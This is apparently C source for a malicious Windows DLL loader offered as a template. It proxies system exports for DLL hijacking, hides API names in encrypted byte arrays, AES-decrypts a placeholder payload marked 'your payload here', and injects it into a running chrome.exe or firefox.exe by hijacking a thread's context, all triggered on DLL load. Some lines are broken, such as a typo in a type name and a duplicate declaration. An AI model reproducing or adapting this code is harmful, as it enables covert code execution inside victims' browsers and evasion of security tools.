#include <windows.h>
#include <stdio.h>
#undef UNICODE
#define UNICODE
#include <tchar.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>
#include <winternl.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#include <wincrypt.h>
#pragma comment (lib, "user32.lib")
#include "helpers.h"


BOOL (WINAPI * pSetThreadContext)( HANDLE hThread,const CONTEXT *lpContext);
BOOL (WINAPI * pWriteProcessMemory)(HANDLE  hProcess,LPVOID  lpBaseAddress,LPCVOID lpBuffer,SIZE_T  nSize,SIZE_T  *lpNumberOfBytesWritten);
BOOL (WINAPI * aWriteProcessMemory)(HANDLE  hProcess,LPVOID  lpBaseAddress,LPCVOID lpBuffer,SIZE_T  nSize,SIZE_T  *lpNumberOfBytesWritten);
LPVOID (WINAPI * pVirtualAllocEx)(HANDLE hProcess,LPVOID lpAddress,SIZE_T dwSize,DWORD  flAllocationType,DWORD  flProtect);
BOOL (WINAPI * pGetThreadContext)(HANDLE hThread,LPCONTEXT lpContext);
BOOL (WINAPI * pVirtualProtect)(LPVOID lpAddress,SIZE_T dwSize,DWORD  flNewProtect,PDWORD lpflOldProtect);
HMODULE (WINAPI * pLoadLibraryA)(LPCSTR lpLibFileName);

//typedef LPVOID (WINAPI * VirtualAlloc_t)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);
//typedef VOID (WINAPI * RtlMoveMemory_t)(VOID UNALIGNED *Destination, const VOID UNALIGNED *Source, SIZE_T Length);

typedef BOOL (WINAPI * (GetThreadContext_T)(HANDLE hThread, ouLPCONTEXT lpContext);

#pragma comment(linker,"/export:CreateEnvironmentBlock=GDyn.CreateEnvironmentBlock,@3")
#pragma comment(linker,"/export:DestroyEnvironmentBlock=GDyn.DestroyEnvironmentBlock,@10")


// XOR function names as opposed to call it directly 
unsigned char sSetThreadContext [] = { 0x29, 0x79, 0xe8, 0x32, 0x10, 0x57, 0xfa, 0x6e, 0x45, 0x7, 0xc2, 0x8d, 0xdd, 0x81, 0x12, 0xd2, 0xa6, 0x77, 0x1c, 0xa8, 0x1b, 0xe2, 0x28, 0xee, 0xd8, 0xf6, 0x24, 0x6f, 0xdb, 0x7a, 0x79, 0xeb };
unsigned char sLoadLibraryA [] =  { 0x49, 0xad, 0x8c, 0x79, 0x90, 0x4f, 0x56, 0x4e, 0x6d, 0xe3, 0x17, 0xee, 0x24, 0x88, 0x41, 0x18 };
unsigned char sVirtualAllocEx [] =  { 0x3e, 0xda, 0x97, 0xe0, 0x2c, 0x43, 0xde, 0x8c, 0x3c, 0x41, 0xa4, 0xfb, 0xc8, 0xaa, 0xc2, 0xfd };
unsigned char sGetThreadContext [] = { 0x78, 0xd0, 0x17, 0xb4, 0x66, 0xaf, 0x7d, 0xf8, 0x13, 0x9d, 0x7d, 0xf1, 0xe2, 0xa1, 0x2e, 0x21, 0xb4, 0xa6, 0x49, 0x96, 0x25, 0xfb, 0x39, 0x83, 0xbe, 0xbc, 0xe3, 0x9, 0xd, 0xaf, 0xc9, 0xfb };
unsigned char sWriteProcessMemory [] = { 0x6e, 0x3, 0xa8, 0xfc, 0xb6, 0x60, 0xda, 0x64, 0xb3, 0x29, 0x1, 0x75, 0xbc, 0x9b, 0xcc, 0x77, 0xb7, 0x87, 0x12, 0xe9, 0xf4, 0x2b, 0x14, 0x78, 0x1d, 0xcb, 0xa5, 0x5e, 0x2f, 0xe0, 0xb4, 0x7d };
char funckey [] =  { 0x46, 0x75, 0x63, 0x6b, 0x54, 0x68, 0x65, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6d };


// your payload here 
unsigned char reload[] = {0x46};

//payload decryption key - best to use a stage as opposed stagless. 
unsigned char key[] = { 0xd0, 0x2a, 0x5a, 0x82, 0x59, 0x81, 0xd9, 0xb6, 0xda, 0x51, 0xf4, 0x34, 0x32, 0xee, 0x77, 0xe };
int reload_len = sizeof(reload);


// AES encryption of the payload 
int AESDecrypt(char * reload, unsigned int reload_len, char * key, size_t keylen) {
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;

	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
			return -1;
	}
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
			return -1;
	}
	if (!CryptHashData(hHash, (BYTE*) key, (DWORD) keylen, 0)){
			return -1;              
	}
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
			return -1;
	}
	
	if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *) reload, (DWORD *) &reload_len)){
			return -1;
	}
	
	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);
	
	return 0;
}


// find the process name we look		
int FindProc(LPCWSTR procname) {

        HANDLE hProcSnap;
        PROCESSENTRY32 pe32;
        int pid = 0;
                
        hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
                
        pe32.dwSize = sizeof(PROCESSENTRY32); 
                
        if (!Process32First(hProcSnap, &pe32)) {
                CloseHandle(hProcSnap);
                return 0;
        }
                
        while (Process32Next(hProcSnap, &pe32)) {
                if (lstrcmpiW(procname, pe32.szExeFile) == 0) {
                        pid = pe32.th32ProcessID;
                        break;
                }
        }
                
        CloseHandle(hProcSnap);
                
        return pid;
}


 //Pid of a thread from the above 
HANDLE FindThread(int pid){

	HANDLE hThread = NULL;
	THREADENTRY32 thEntry;

	thEntry.dwSize = sizeof(thEntry);
    HANDLE Snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
		
	while (Thread32Next(Snap, &thEntry)) {
		if (thEntry.th32OwnerProcessID == pid) 	{
			hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, thEntry.th32ThreadID);
			break;
		}
	}
	CloseHandle(Snap);
	
	return hThread;
}

// CTX injection 

int CTX(HANDLE hProc, int pid, unsigned char * reload, unsigned int reload_len) {

	HANDLE hThread = NULL;
	LPVOID pRemoteCode = NULL;
	CONTEXT ctx;

	hThread = FindThread(pid);
	if (hThread == NULL) {
		return -1;
	}

	// Decrypt reload
	AESDecrypt((char *) reload, reload_len, (char *) key, sizeof(key));
	
	
	GetThreadContext_T pGetThreadContext = (GetThreadContext_T) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "GetThreadContext");
	//VirtualAlloc_t pVirtualAlloc = (VirtualAlloc_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "VirtualAlloc");
	//RtlMoveMemory_t pRtlMoveMemory = (RtlMoveMemory_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "RtlMoveMemory");
	
	AESDecrypt((char *) sWriteProcessMemory, sizeof(sWriteProcessMemory), funckey, sizeof(funckey));
	pWriteProcessMemory = GetProcAddress(GetModuleHandle("kernel32.dll"), sWriteProcessMemory);
	
	AESDecrypt((char *) sVirtualAllocEx, sizeof(sVirtualAllocEx), funckey, sizeof(funckey));
	pVirtualAllocEx = GetProcAddress(GetModuleHandle("kernel32.dll"), sVirtualAllocEx);
	
	// perform reload injection
	pRemoteCode = pVirtualAllocEx(hProc, NULL, reload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
	pWriteProcessMemory(hProc, pRemoteCode, (PVOID) reload, (SIZE_T) reload_len, (SIZE_T *) NULL);


	
	//AESDecrypt((char *) sGetThreadContext, sizeof(sGetThreadContext), funckey, sizeof(funckey));
	//pGetThreadContext = GetProcAddress(GetModuleHandle("kernel32.dll"), sGetThreadContext);
	
	GetThreadContext_T pGetThreadContext = (GetThreadContext_T) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "GetThreadContext");

	AESDecrypt((char *) sSetThreadContext, sizeof(sSetThreadContext), funckey, sizeof(funckey));
	pSetThreadContext = GetProcAddress(GetModuleHandle("kernel32.dll"), sSetThreadContext);

	
	SuspendThread(hThread);	
	ctx.ContextFlags = CONTEXT_FULL;
	pGetThreadContext(hThread, &ctx);
#ifdef _M_IX86 
	ctx.Eip = (DWORD_PTR) pRemoteCode;
#else
	ctx.Rip = (DWORD_PTR) pRemoteCode;
#endif
	pSetThreadContext(hThread, &ctx);
	
	return ResumeThread(hThread);	
}

// static but could be a list of remote process 
int Try(void){
	
	int pid = FindProc(L"chrome.exe");
	
	if (!pid){
		pid = FindProc(L"firefox.exe");
	} 
	
    HANDLE hProc = NULL;
	
	if (pid) {


		hProc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
						FALSE, (DWORD) pid);

		if (hProc != NULL) {
			//Sleep(1*300000);
			CTX(hProc,pid,reload, reload_len);
			CloseHandle(hProc);
		}
	}else{
			//Sleep(5*20000);
			
		}
	return 0;
}



BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved) {

    switch (ul_reason_for_call)  {
    case DLL_PROCESS_ATTACH:
		Try();
		break;
   
    }
    return TRUE;
}






